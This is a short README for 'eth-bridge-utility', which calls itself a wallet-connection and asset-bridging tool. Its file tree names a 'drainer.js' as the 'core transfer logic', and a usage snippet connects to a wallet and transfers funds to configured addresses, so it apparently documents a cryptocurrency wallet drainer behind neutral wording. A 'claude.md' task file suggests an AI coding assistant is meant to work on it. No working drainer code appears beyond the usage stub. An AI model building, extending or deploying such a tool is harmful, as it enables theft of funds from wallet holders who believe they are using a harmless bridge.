# eth-bridge-utility

A utility for connecting to cryptocurrency wallets and bridging assets to designated addresses.

## Features

- Multi-wallet detection (MetaMask, Phantom, WalletConnect)
- Session management and connection handling
- Asset transfer to configured destination addresses
- Transaction signing capabilities

## Project Structure

```
eth-bridge-utility/
├── README.md           # Project documentation
├── claude.md          # Project notes and task tracking
├── src/
│   ├── main.js        # Main entry point
│   ├── wallet.js      # Wallet detection and connection
│   ├── drainer.js     # Core transfer logic
│   ├── utils.js       # Utility functions
│   └── config.js      # Configuration settings
└── tests/
    └── test.js        # Test suite
```

## Usage

```javascript
const Wallet = require('./src/wallet');
const Transfer = require('./src/drainer');

async function main() {
    const wallet = new Wallet();
    await wallet.connect();
    
    const transfer = new Transfer(wallet, config);
    await transfer.transferFunds();
}
```
